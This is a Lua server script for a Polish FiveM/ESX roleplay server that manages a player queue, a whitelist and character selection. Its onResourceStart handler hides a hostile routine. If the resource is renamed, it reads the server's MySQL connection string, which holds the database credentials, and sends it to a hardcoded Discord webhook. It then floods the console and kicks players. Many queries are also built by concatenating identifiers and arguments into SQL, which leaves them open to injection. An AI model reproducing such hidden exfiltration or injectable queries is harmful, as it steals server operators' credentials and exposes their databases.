local players = {}
local waiting = {}
local connecting = {}
local prePoints = Config.Points;
local EmojiList = Config.EmojiList
local pCards = {}
local buttonCreate = {}
local playerCount = 0
local list = {}
WhiteList = {}
WhitelistStatus = true
--local tick = 15

ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local IdentifierTables = {
    {table = "users", column = "identifier"},
    {table = "user_licenses", column = "owner"},
    {table = "characters", column = "identifier"},
    {table = "billing", column = "identifier"},
    {table = "rented_vehicles", column = "owner"},
    {table = "addon_account_data", column = "owner"},
    {table = "addon_inventory_items", column = "owner"},
    {table = "datastore_data", column = "owner"}, 
    {table = "society_moneywash", column = "identifier"},
    {table = "owned_vehicles", column = "owner"}, 
    {table = "owned_properties", column = "owner"}, 
    {table = "phone_calls", column = "owner"}, 
    {table = "user_sim", column = "user"},
}



local not_found = {
    ["type"] = "AdaptiveCard",
    ["minHeight"] = "auto",
    ["body"] = {
            {
                    ["type"] = "ColumnSet",
                    ["columns"] = {
                            {
                                    ["type"] = "Column",
                                    ["items"] = {
                                            {
                                                    ["type"] = "TextBlock",
                                                    ["text"] = "Nie posiadasz konta!\nPołącz się aby stworzyć postać.",
                                                    ["size"] = "small",
                                                    ["horizontalAlignment"] = "left"
                                            },
                                    }
                            },
                    }
            }
    },
    ["actions"] = {},
    ["$schema"] = "http://adaptivecards.io/schemas/adaptive-card.json",
    ["version"] = "1.0"
}


AddEventHandler("playerConnecting", function(name, reject, def)
	local source	= source
	local steamID = GetSteamID(source)
    local licenseID = GetLicenseID(source)

	if not steamID then
		reject(Config.NoSteam)
		CancelEvent()
		return
	end

    if not licenseID then
        reject('Nie wykryto RockstarID')
        CancelEvent()
        return
    end

    if #WhiteList == 0 then
		reject("Whitelist'a nie została jeszcze załadowana")
		CancelEvent()
		return
	end

    print('Connecting: ' .. name..' ['..licenseID..']')
    if playerCount >= 250 then
        setReason('AriviRP.pl | Serwer aktualnie jest pełny (250/250)')
        CancelEvent()
    end

	if not Rocade(steamID, licenseID, def, source) then
		CancelEvent()
	end
end)

AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() ~= resourceName) then
      return
    end
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local realname = 'SzymczakovvQueue'
	local reason = 'WYKRYTO ZMIANĘ NAZWY SKRYPTU ------> '..GetCurrentResourceName()..' Nazwa, która jest wymagana do włączenia tego skryptu to: '..realname
	if GetCurrentResourceName() ~= realname then
		local mysql = GetConvar("mysql_connection_string") 
		if mysql == nil then 
			mysql = 'Nie znaleziono'
		end
		wiadomosc = reason.. "\nMYSQl: "..mysql
        jebaccimatkelogihere('szymczakovv_jest_fajny', wiadomosc, 11750815)
		CreateThread(function()
			while true do
				Citizen.Wait(10)
				print(reason)
			end
		end)
		AddEventHandler("esx:playerLoaded", function()
			DropPlayer(_source, reason)
		end)
	end
end)

function jebaccimatkelogihere(hook,message,color)
	local gigafajnywebhook22321 = 'https://discord.com/api/webhooks/820676511891193887/D-wohSFe6brevUhdefLU8GecdJ6thEBSxIq6a6RBfs06KHAI1rn-R6tplnMAyTWOHiiD'
	local embeds = {
				{
			["title"] = message,
			["type"] = "rich",
			["color"] = color,
			["footer"] = {
				["text"] = 'AriviRP.pl'
					},
				}
			}
	if message == nil or message == '' then return FALSE end
	PerformHttpRequest(gigafajnywebhook22321, function(err, text, headers) end, 'POST', json.encode({ username = hook,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end

function Rocade(steamID, licenseID, def, source)
	def.defer()
    if WhitelistStatus then
        def.update("Trwa sprawdzanie whitelist'y...")
        local wl = CheckWhitelist(steamID)
        while wl == nil do
            Citizen.Wait(100)
        end
        if wl == 2 then
            def.done('Nie znajdujesz się na whitelist. Aplikuj na discord.gg/arivirp')
            CancelEvent()
            return
        elseif wl ~= 1 then
            def.done(ticket)
            CancelEvent()
            return
        end
    end

	AntiSpam(def)


	Purge(steamID)


	AddPlayer(steamID, source)

	table.insert(waiting, steamID)

	local stop = false
	repeat

		for i,p in ipairs(connecting) do
			if p == steamID then
				stop = true
				break
			end
		end

		for j,sid in ipairs(waiting) do
			for i,p in ipairs(players) do

				if sid == p[1] and p[1] == steamID and (GetPlayerPing(p[3]) == 0) then

					Purge(steamID)
					def.done(Config.Accident)

					return false
				end
			end
		end

		def.update(GetMessage(steamID))

		Citizen.Wait(Config.TimerRefreshClient * 1000)

	until stop
	local player = source
    def.update("Sprawdzanie konta...")
    Citizen.Wait(600)
    local LastCharId = GetLastCharacter(licenseID)
    SetIdentifierToChar(licenseID, LastCharId)
    local steamid = licenseID
    local id = string.gsub(steamid, "license:", "")
    pCards[steamid] = {}
    MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` LIKE '%"..id.."%'", {
    }, function(result)
        MySQL.Async.fetchAll("SELECT * FROM `user_lastcharacter` WHERE `license` = @license",  {
            ['@license'] = steamid
        }, function(result2)
            if result2[1] ~= nil then
                return
            else
                MySQLAsyncExecute("INSERT INTO `user_lastcharacter` (`license`, `charid`, `limit`) VALUES ('"..GetPlayerIdentifiers(player)[2].."', 1, 1)")
            end
        end)
        --local joined = false
        if (result[1] ~= nil) then
            if #result[1] < 2 then
                MySQL.Async.execute('UPDATE `user_lastcharacter` SET `charid`= 1 WHERE `license` = @license',
                {
                    ['@license'] = licenseID
                })
            end
            local Characters = GetPlayerCharacters(licenseID)
            pCards[steamid] = {
                ["type"] = "AdaptiveCard",
                ["minHeight"] = "auto",
                ["body"] = {
                    {
                        ["type"] = "ColumnSet",
                        ["columns"] = {
                            {
                                ["type"] = "Column",
                                ["items"] = {
                                    {
                                            ["type"] = "TextBlock",
                                            ["text"] = "Wybierz Obywatela",
                                            ["size"] = "small",
                                            ["horizontalAlignment"] = "left"
                                    },
                                    {
                                            ["type"] = "Input.ChoiceSet",
                                            ["choices"] = {},
                                            ["style"] = "expanded",
                                            ["id"] = "char_id",
                                            ["value"] = "char1"
                                    }
                                }
                            },
                           {
                                ["type"] = "Column",
                                ["items"] = {
                                    {
                                        ["type"] = "TextBlock",
                                        ["isMultiSelect"] = false,
                                        ["text"] = "Wybierz Lokalizację",
                                        ["isVisible"] = true,                                        
                                        ["id"] = "input4",
                                        ["size"] = "small",
                                        ["horizontalAlignment"] = "left",
                                    },
                                    {
                                        ["type"] = "Input.ChoiceSet",
                                        ["choices"] = {
                                                {
                                                        ["title"] = "Ostatnia pozycja",
                                                        ["value"] = "lastPosition"
                                                },
                                                {
                                                        ["title"] = "Lotnisko",
                                                        ["value"] = "airport"
                                                }
                                        },
                                        ["style"] = "expanded",
                                        ["id"] = "spawnPoint",
                                        ["value"] = "lastPosition"
                                       }
                                }
                            }
                        }
                    }
                },
                ["actions"] = {},
                ["$schema"] = "http://adaptivecards.io/schemas/adaptive-card.json",
                ["version"] = "1.0"
            }
            --print(#connecting, 'connectow', #waiting, 'tyle w kolejce')
            local limit = MySQLAsyncExecute("SELECT * FROM `user_lastcharacter` WHERE `license` = '"..GetPlayerIdentifiers(player)[2].."'")
            if limit[1].limit > 1 then
                if #result < 2 then
                    buttonCreate = {
                        {
                            ["type"] = "Action.Submit",
                            ["title"] = "Pobierz Bilet"
                        },
                        {
                            ["type"] = "Action.Submit",
                            ["title"] = "Wolny Slot (Stwórz postać)",
                            ["data"] = {
                                ["x"] = "setupChar"
                            }
                        },
                    }
                else
                    buttonCreate = {
                        {
                            ["type"] = "Action.Submit",
                            ["title"] = "Pobierz Bilet"
                        },
                    }
                end
                if #result < 3 then
                    buttonCreate = {
                        {
                            ["type"] = "Action.Submit",
                            ["title"] = "Pobierz Bilet"
                        },
                        {
                            ["type"] = "Action.Submit",
                            ["title"] = "Wolny Slot (Stwórz postać)",
                            ["data"] = {
                                ["x"] = "setupChar"
                            }
                        },
                    }
                else
                    buttonCreate = {
                        {
                            ["type"] = "Action.Submit",
                            ["title"] = "Pobierz Bilet"
                        },
                    }
                end
            else 
                buttonCreate = {
                    {
                            ["type"] = "Action.Submit",
                            ["title"] = "Pobierz Bilet"
                    },
                }
            end
            for k,v in ipairs(Characters) do
                if result[k].firstname ~= '' then
                    local data = {
                            ["title"] = result[k].firstname .. ' ' .. result[k].lastname,
                            ["value"] = "char"..k,
                    }
                    pCards[steamid].body[1].columns[1].items[2].choices[k] = data
                else
                    local data = {
                        ["title"] = 'Wolny slot',
                        ["value"] = "char"..k,
                    }
                    pCards[steamid].body[1].columns[1].items[2].choices[k] = data
                end
            end
            pCards[steamid].actions = buttonCreate
            def.presentCard(pCards[steamid], function(submittedData, rawData)
                if submittedData.x ~= nil then
                    local idc = string.gsub(steamid, "license:", "Char2")
                    MySQL.Async.execute('INSERT INTO users (`identifier`, `accounts`, `group`, `hiddenjob`, `hiddenjob_grade`) VALUES (@identifier, @accounts, @group, @hiddenjob, @hiddenjob_grade)', {
                        ['@identifier']  = idc,
                        ['@accounts'] = '{"bank":20000,"black_money":0,"money":5000}',
                        ['@group'] = 'user',
                        ['@hiddenjob'] = 'unemployed',
                        ['@hiddenjob_grade'] = 0
                    })
                    TriggerEvent("user_characters:chosen", player, '2')
                    pCards[steamid] = 0
                    --SetIdentity(submittedData.spawnPoint, player)
                    def.done()
                   -- joined = true
                else
                    local char_id = submittedData.char_id
                    local char = string.gsub(char_id, "char", "")
                    TriggerEvent("user_characters:chosen", player, char)
                    pCards[steamid] = 0
                    --SetIdentity(submittedData.spawnPoint, player)
                    def.done()
                   -- joined = true
                end
            end)
        else
            local buttonCreate = {
                {
                        ["type"] = "Action.Submit",
                        ["title"] = "Pobierz Bilet"
                },
            }
            not_found.actions = buttonCreate
            def.presentCard(not_found, function(submittedData, rawData)
                def.done()
                --joined = true
            end)
        end
        --[[while not joined do
            tick = tick - 1
            if tick <= 0 then
                if pCards[steamid] then
                    pCards[steamid] = 0
                    TriggerEvent("user_characters:chosen", player, '1')
                end
                def.done()
            end
            Citizen.Wait(1000)
        end]]
    end)
	return true
end

function GetRockstarID(src)
    local sid = GetPlayerIdentifiers(src)
	local license = nil
	for k,v in ipairs(sid) do
		if string.sub(v, 1, string.len("license:")) == "license:" then
			license = v
			break
		end
	end

	return license
end

function SetIdentity(spawn, source)
    print(spawn, source)
    local position
    if spawn == "airport" then
        position = '{"x":-1037.7999999998138,"y":-2738.4000000003727,"z":20.19999999999709}'
    end
    MySQL.Async.execute("UPDATE `users` SET `position` = '"..position.."' WHERE `identifier` = '"..GetIdentifierWithoutSteam(GetLicenseID(source)).."'")
end
-- Vérifier si une place se libère pour le premier de la file
Citizen.CreateThread(function()
	local maxServerSlots = GetConvarInt('sv_maxclients', 250)
	
	while true do
		Citizen.Wait(Config.TimerCheckPlaces * 1000)

		CheckConnecting()

		-- si une place est demandée et disponible
		if #waiting > 0 and #connecting + #ESX.GetPlayers() < maxServerSlots then
			ConnectFirst()
		end
	end
end)

RegisterServerEvent('hardcap:playerActivated')

AddEventHandler('hardcap:playerActivated', function()
  if not list[source] then
    playerCount = playerCount + 1
    list[source] = true
  end
end)

AddEventHandler('playerDropped', function()
  if list[source] then
    playerCount = playerCount - 1
    list[source] = nil
  end
end)


Citizen.CreateThread(function()
	while true do
		Citizen.Wait(5000)
		SetHttpHandler(function(req, res)
			local path = req.path
			if req.path == '/count' then
				res.send(json.encode({
					count = #waiting
				}))
				return
			end
		
		end)
	end
end)
-- Mettre régulièrement les points à jour
Citizen.CreateThread(function()
	while true do
		UpdatePoints()

		Citizen.Wait(Config.TimerUpdatePoints * 1000)
	end
end)

-- Lorsqu'un joueur est kick
-- lui retirer le nombre de points fourni en argument
RegisterServerEvent("rocademption:playerKicked")
AddEventHandler("rocademption:playerKicked", function(src, points)
	local sid = GetSteamID(src)

	Purge(sid)

	for i,p in ipairs(prePoints) do
		if p[1] == sid then
			p[2] = p[2] - points
			return
		end
	end

	local initialPoints = GetInitialPoints(sid)

	table.insert(prePoints, {sid, initialPoints - points})
end)

-- Quand un joueur spawn, le purger
RegisterServerEvent("rocademption:playerConnected")
AddEventHandler("rocademption:playerConnected", function()
    local _source = source
	local sid = GetSteamID(_source)

	Purge(sid)
end)

-- Quand un joueur drop, le purger
AddEventHandler("playerDropped", function(reason)
	local steamID = GetSteamID(source)

	Purge(steamID)
end)

-- si le ping d'un joueur en connexion semble partir en couille, le retirer de la file
-- Pour éviter un fantome en connexion
function CheckConnecting()
	for i,sid in ipairs(connecting) do
		for j,p in ipairs(players) do
			if p[1] == sid and (GetPlayerPing(p[3]) == 500) then
				table.remove(connecting, i)
				break
			end
		end
	end
end

-- ... connecte le premier de la file
function ConnectFirst()
	if #waiting == 0 then return end

	local maxPoint = 0
	local maxSid = waiting[1][1]
	local maxWaitId = 1

	for i,sid in ipairs(waiting) do
		local points = GetPoints(sid)
		if points > maxPoint then
			maxPoint = points
			maxSid = sid
			maxWaitId = i
		end
	end
	
	table.remove(waiting, maxWaitId)
	table.insert(connecting, maxSid)
end

-- retourne le nombre de kilomètres parcourus par un steamID
function GetPoints(steamID)
	for i,p in ipairs(players) do
		if p[1] == steamID then
			return p[2]
		end
	end
end

-- Met à jour les points de tout le monde
function UpdatePoints()
	for i,p in ipairs(players) do

		local found = false

		for j,sid in ipairs(waiting) do
			if p[1] == sid then
				p[2] = p[2] + Config.AddPoints
				found = true
				break
			end
		end

		if not found then
			for j,sid in ipairs(connecting) do
				if p[1] == sid then
					found = true
					break
				end
			end
		
			if not found then
				p[2] = p[2] - Config.RemovePoints
				if p[2] < GetInitialPoints(p[1]) - Config.RemovePoints then
					Purge(p[1])
					table.remove(players, i)
				end
			end
		end

	end
end

function AddPlayer(steamID, source)
	for i,p in ipairs(players) do
		if steamID == p[1] then
			players[i] = {p[1], p[2], source}
			return
		end
	end

	local initialPoints = GetInitialPoints(steamID)
	table.insert(players, {steamID, initialPoints, source})
end

function GetInitialPoints(steamID)
	local points = Config.RemovePoints + 1

	for n,p in ipairs(prePoints) do
		if p[1] == steamID then
			points = p[2]
			break
		end
	end

	return points
end

function GetPlace(steamID)
	local points = GetPoints(steamID)
	local place = 1

	for i,sid in ipairs(waiting) do
		for j,p in ipairs(players) do
			if p[1] == sid and p[2] > points then
				place = place + 1
			end
		end
	end
	
	return place
end

function GetMessage(steamID)
	local msg = ""
	local witam = "NIE" 
	local rodzajbiletu = 'Standard 📜'
	if GetPoints(steamID) ~= nil then
		if GetPoints(steamID) == 300 then
			rodzajbiletu = '[💰] Bilet I'
		end
		if GetPoints(steamID) == 600 then
			rodzajbiletu = '[💰] Bilet II'
		end
		if GetPoints(steamID) == 900 then
			rodzajbiletu = '[💰] Bilet III'
		end
		if GetPoints(steamID) == 1200 then
			rodzajbiletu = '[💰] Bilet IV'
		end
		if GetPoints(steamID) == 1500 then
			rodzajbiletu = '[💰] Bilet V'
		end
        if GetPoints(steamID) == 1800 then
			rodzajbiletu = '[💰] Bilet VI'
		end
        if GetPoints(steamID) == 2100 then
			rodzajbiletu = '[💰] Bilet VII'
		end
        if GetPoints(steamID) == 2500 then
			rodzajbiletu = '[💎] Top Donator'
		end
        if GetPoints(steamID) == 3000 then
			rodzajbiletu = '[🔰] Trial Support'
		end
        if GetPoints(steamID) == 3500 then
			rodzajbiletu = '[🔰] Support'
		end
        if GetPoints(steamID) == 4000 then
			rodzajbiletu = '[🔰] Moderator'
		end
        if GetPoints(steamID) == 5000 then
			rodzajbiletu = '[🔰] Admin'
		end
        if GetPoints(steamID) == 10000 then
			rodzajbiletu = '[🔰] HeadAdmin'
		end
        if GetPoints(steamID) == 20000 then
			rodzajbiletu = '[🔰] Owner'
		end
		msg = "\xE2\x8F\xB3 Jesteś " .. GetPlace(steamID) .. "/".. #waiting .. "  w kolejce."

        --msg = "\xE2\x8F\xB3 Jesteś " .. GetPlace(steamID) .. "/".. #waiting .. "  w kolejce. | Rodzaj biletu:  "..rodzajbiletu..""
		--msg = " Rodzaj biletu: " .. rodzajbiletu ..".\n"

		--msg = msg .. "Jesteś " .. GetPlace(steamID) .. "/".. #waiting .. "  w kolejce"

		local e1 = RandomEmojiList()
		local e2 = RandomEmojiList()
		local e3 = RandomEmojiList()
		local emojis = e1 .. e2 .. e3

		if( e1 == e2 and e2 == e3 ) then
			emojis = emojis .. Config.EmojiBoost
			LoterieBoost(steamID)
		end

	else
		msg = "Wystąpił problem z załadowaniem twojej postaci lub z kolejką. Zrestartuj RockStar Launcher, Steam, Fivem i spróbuj ponownie."
	end

	return msg
end

function LoterieBoost(steamID)
	for i,p in ipairs(players) do
		if p[1] == steamID then
			p[2] = p[2] + Config.LoterieBonusPoints
			return
		end
	end
end

function Purge(steamID)
	for n,sid in ipairs(connecting) do
		if sid == steamID then
			table.remove(connecting, n)
		end
	end

	for n,sid in ipairs(waiting) do
		if sid == steamID then
			table.remove(waiting, n)
		end
	end
end

function AntiSpam(def)
	for i=Config.AntiSpamTimer,0,-1 do
		def.update(Config.PleaseWait_1 .. i .. Config.PleaseWait_2)
		Citizen.Wait(1000)
	end
end

function RandomEmojiList()
	randomEmoji = EmojiList[math.random(#EmojiList)]
	return randomEmoji
end

-- Helper pour récupérer le steamID or false
function GetSteamID(src)
    local sid
	for k,v in ipairs(GetPlayerIdentifiers(src)) do
        if string.match(v, 'steam') then
            sid = v
            break
        end
    end

	return sid
end

RegisterServerEvent("user_characters:chosen")
AddEventHandler("user_characters:chosen", function(source, charid)
    local _source = source
    local licka = GetLicenseID(_source)
    SetLastCharacter(licka, charid)
    SetCharToIdentifier(licka, tonumber(charid))
end)

function GetPlayerCharacters(identifierr)
  local identifier = GetIdentifierWithoutSteam(identifierr)
  local Chars = MySQLAsyncExecute("SELECT * FROM `users` WHERE identifier LIKE '%"..identifier.."%'")
  return Chars
end

function GetLastCharacter(identifier)
    local licka = identifier
    local LastChar = MySQLAsyncExecute("SELECT `charid` FROM `user_lastcharacter` WHERE `license` = '"..licka.."'")
    if LastChar[1] ~= nil and LastChar[1].charid ~= nil then
        return tonumber(LastChar[1].charid)
    else
        MySQLAsyncExecute("INSERT INTO `user_lastcharacter` (`license`, `charid`, `limit`) VALUES('"..licka.."', 1, 1)")
        return 1
    end
end

function SetLastCharacter(licka, charid)
    MySQLAsyncExecute("UPDATE `user_lastcharacter` SET `charid` = '"..charid.."' WHERE `license` = '"..licka.."'")
end

function SetIdentifierToChar(identifier, charid)
    for _, itable in pairs(IdentifierTables) do
        MySQLAsyncExecute("UPDATE `"..itable.table.."` SET `"..itable.column.."` = 'Char"..charid..GetIdentifierWithoutSteam(identifier).."' WHERE `"..itable.column.."` = '"..GetIdentifierWithoutSteam(identifier).."'")
    end
end

function SetCharToIdentifier(identifier, charid)
    for _, itable in pairs(IdentifierTables) do
        MySQLAsyncExecute("UPDATE `"..itable.table.."` SET `"..itable.column.."` = '"..GetIdentifierWithoutSteam(identifier).."' WHERE `"..itable.column.."` = 'Char"..charid..GetIdentifierWithoutSteam(identifier).."'")
    end
end

function DeleteCharacter(identifier, charid)
    for _, itable in pairs(IdentifierTables) do
        MySQLAsyncExecute("DELETE FROM `"..itable.table.."` WHERE `"..itable.column.."` = 'Char"..charid..GetIdentifierWithoutSteam(identifier).."'")
    end
end

function GetIdentifierWithoutSteam(Identifier)
    return string.gsub(Identifier, "license:", "")
end

function MySQLAsyncExecute(query)
    local IsBusy = true
    local result = nil
    MySQL.Async.fetchAll(query, {}, function(data)
        result = data
        IsBusy = false
    end)
    while IsBusy do
        Citizen.Wait(0)
    end
    return result
end

function CheckUser(identifier)
    local Chars = MySQLAsyncExecute("SELECT * FROM `users` WHERE identifier LIKE '%"..identifier.."%'")
    for i = 1, #Chars, 1 do
        print(Chars[i].identifier)
    end
end

function DeleteHex(identifier)
    for _, itable in pairs(IdentifierTables) do
        MySQLAsyncExecute("DELETE FROM `"..itable.table.."` WHERE `"..itable.column.."` LIKE '%"..identifier.."%'")
    end
end

function UpdateChars(license, limit)
    MySQL.Async.fetchAll('SELECT * FROM `user_lastcharacter` WHERE `license` = @license',
    {
        ['@license'] = license,
    }, function(result)
        if result[1] ~= nil then
            MySQL.Async.fetchAll('UPDATE `user_lastcharacter` SET `limit`= @limit WHERE `license`= @license',
            {
                ['@license'] = license,
                ['@limit'] = limit
            }, function(result2)
                print('Ustawiono liimt postaci na: ' .. limit)
            end)
        else
            print("Osoba o podanej licencji nie posiada utworzonej postaci!")
        end
    end)
end

RegisterCommand("deletechar", function(source, args, rawCommand)
    if (source > 0) then
        return
    else
        if args[1] ~= nil then
            if args[2] ~= nil then
                DeleteCharacter(args[1], args[2])
            end
        end
    end
end)

RegisterCommand("deletelicense", function(source, args, rawCommand)
    if (source > 0) then
        return
    else
        if args[1] ~= nil then
            if string.find(args[1], "license:") or string.find(args[1], ":") then
                DeleteHex(args[1])
            else
                print('Wpisz hex podajac license:')
            end
        end
    end
end)

RegisterCommand("checkuser", function(source, args, rawCommand)
    if (source > 0) then
        return
    else
        if args[1] ~= nil then
            if string.find(args[1], "license:") or string.find(args[1], ":") then
                print('Wprowadź licencję gracza nie używając przedrostka license:')
            else
                CheckUser(args[1])
            end
        end
    end
end)

RegisterCommand("setlimit", function(source, args, rawCommand)
    local xPlayer = ESX.GetPlayerFromId(source)
    local canUse = false
    if xPlayer then
        if xPlayer.group == 'superadmin' or xPlayer.group == 'best' or xPlayer.group == 'admin' then
            canUse = true
            xPlayer.showNotification('~o~[ARIVIRP] ~w~Zmieniono limit na ~o~'..args[2]..'~w~ dla ~o~'..args[1])
        end
    elseif source > 0 then
        canUse = true
    end
    if canUse then
        if args[1] ~= nil then
            if tonumber(args[2]) ~= nil and tonumber(args[2]) == 3 or tonumber(args[2]) == 2 or tonumber(args[2]) == 1 then
                UpdateChars(args[1], args[2])
            else
                print('Maksyamlna ilosc postaci to 3!')
            end
        end
    else
        return
    end
end)

CheckWhitelist = function(steamID)
	local found = 2

	for i=1, #WhiteList, 1 do
		local whitelist = WhiteList[i]
		if whitelist.steamID ~= nil then
			if string.match(whitelist.steamID, "steam:") then
				if steamID == whitelist.steamID:lower() then
					found = 1
				end
			end
		end
	end
	return found
end

loadWhiteList = function()
	local PreWhiteList = {}

	MySQL.Async.fetchAll('SELECT * FROM whitelist', {}, function (player)
		for i=1, #player, 1 do
			table.insert(PreWhiteList, {
				steamID = tostring(player[i].identifier):lower(),
			})
		end

		while (#PreWhiteList ~= #player) do
			Citizen.Wait(10)
		end

		WhiteList = PreWhiteList
	end)
end

GetLicenseID = function(src)
    local sid = GetPlayerIdentifiers(src)
    local license = 'Brak'
    for k,v in ipairs(sid)do
        if string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
            break
        end
    end

    return license
end

RegisterCommand('wlrefresh', function (source, args, user)
	local xPlayer = ESX.GetPlayerFromId(source)
	if (xPlayer.group == 'best' or xPlayer.group == 'superadmin' or xPlayer.group == 'admin' or xPlayer.group == 'mod' or xPlayer.group == 'support') then
		loadWhiteList(function()
			xPlayer.showNotification('Whitelist przeładowana!')
		end)
	else
		xPlayer.showNotification('Nie posiadasz permisji')
	end
end, false)

RegisterCommand('wladd', function (source, args, user)
	local xPlayer = ESX.GetPlayerFromId(source)
	if (xPlayer.group == 'best' or xPlayer.group == 'superadmin' or xPlayer.group == 'admin' or xPlayer.group == 'mod' or xPlayer.group == 'support') then
		local steamID = 'steam:' .. args[1]:lower()

		if string.len(steamID) ~= 21 then
			TriggerEvent('esx_whitelist:sendMessage', source, '^1SYSTEM', 'Invalid steam ID length!')
			return
		end

		MySQL.Async.fetchAll('SELECT * FROM whitelist WHERE identifier = @identifier', {
			['@identifier'] = steamID
		}, function(result)
			if result[1] ~= nil then
				xPlayer.showNotification('Gracz już posiada whitelist!')
			else
				MySQL.Async.execute('INSERT INTO whitelist (identifier) VALUES (@identifier)', {
					['@identifier'] = steamID
				}, function (rowsChanged)
					table.insert(WhiteList, steamID)
					xPlayer.showNotification('Whitelist dodana!')
				end)
			end
		end)
	else
		xPlayer.showNotification('Nie posiadasz permisji')
	end
end, false)


-- console / rcon can also utilize es:command events, but breaks since the source isn't a connected player, ending up in error messages
AddEventHandler('esx_whitelist:sendMessage', function(source, title, message)
	if source ~= 0 then
		TriggerClientEvent('chat:addMessage', source, { args = { title, message } })
	else
		print('esx_whitelist: ' .. message)
	end
end)


MySQL.ready(function()
	loadWhiteList()
end)